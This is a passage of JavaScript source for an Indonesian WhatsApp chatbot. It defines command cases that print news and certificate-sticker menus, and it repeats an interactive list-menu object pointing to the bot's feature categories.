│⦿ 〔 _.quotesgalau_ 
│⦿ 〔 _.quotesgombal_ 
│⦿ 〔 _.quoteshacker_ 
│⦿ 〔 _.quotesbijak_ 
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'beritamenubutton': {
let teks =`┏『 *\`乂 ʙ ᴇ ʀ ɪ ᴛ ᴀ - ᴍ ᴇ ɴ ᴜ 乂\`* 』━◧
║◦ *${prefix}fajar*
║◦ *${prefix}cnn*
║◦ *${prefix}layarkaca*
║◦ *${prefix}cnbc*
║◦ *${prefix}tribun*
║◦ *${prefix}indozone*
║◦ *${prefix}kompas*
║◦ *${prefix}detiknews*
║◦ *${prefix}dailynews*
║◦ *${prefix}inews*
║◦ *${prefix}okezone*
║◦ *${prefix}sindo*
║◦ *${prefix}tempo*
║◦ *${prefix}antara*
║◦ *${prefix}kontan*
║◦ *${prefix}merdeka*
║◦ *${prefix}jalantikus*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'sertifikatmenubutton': {
let teks =`◤─「 \`CERTIFIKAT MENU\` 」─✦
│⦿ 〔 _.stkbaik_
│⦿ 〔 _.stkcantik_
│⦿ 〔 _.stkganteng_
│⦿ 〔 _.stkhitam_
│⦿ 〔 _.stkmiskin_
│⦿ 〔 _.stkkaya_
│⦿ 〔 _.stkmarah_
│⦿ 〔 _.stksabar_
│⦿ 〔 _.stksakiti_
│⦿ 〔 _.stkkeren_
│⦿ 〔 _.stkstkmisterius_
│⦿ 〔 _.stksantai_
│⦿ 〔 _.stksombong_
│⦿ 〔 _.stklucu_
│⦿ 〔 _.stkgila_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
